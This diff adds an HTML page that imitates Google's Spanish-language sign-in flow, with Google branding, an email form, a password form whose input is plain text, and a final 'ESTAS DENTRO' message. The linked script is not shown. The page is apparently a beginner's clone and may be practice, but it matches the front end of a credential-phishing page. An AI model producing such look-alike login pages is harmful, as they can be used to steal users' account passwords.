@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="card">
+        <form id="correo" action="POST">
+            <img src="google.png" width="50px">
+            <h1>Inicia sesión</h1>
+            <div id="error">
+                <p>con tu cuenta de Google para ir a Gmail. Esta cuenta estará</p>
+                <p>disponible para otras aplicaciones de Google en el navegador.</p>
+            </div>
+            <input id="verificacion" type="mail" placeholder="Ingresa tu correo">
+            <br>
+            <button id="siguiente" type="submit">Siguiente</button>
+        </form>
+
+
+        <form id="clave" class="clave" action="POST">
+            <img src="google.png" width="50px">
+            <div id="error2">
+                <h1>Te damos la bienvenida</h1>
+            </div>
+            <input id="verificacion2" type="text" placeholder="Introduce tu contraseña">
+            <br>
+            <button id="acceso" type="submit">Siguiente</button>
+        </form>
+
+        <div id="fin" class="fin">
+            <h1 id="ingreso">ESTAS DENTRO</h1>
+        </div>
+    </div>
+    <script src="script/script.js"></script>
+</body>
+
+</html>
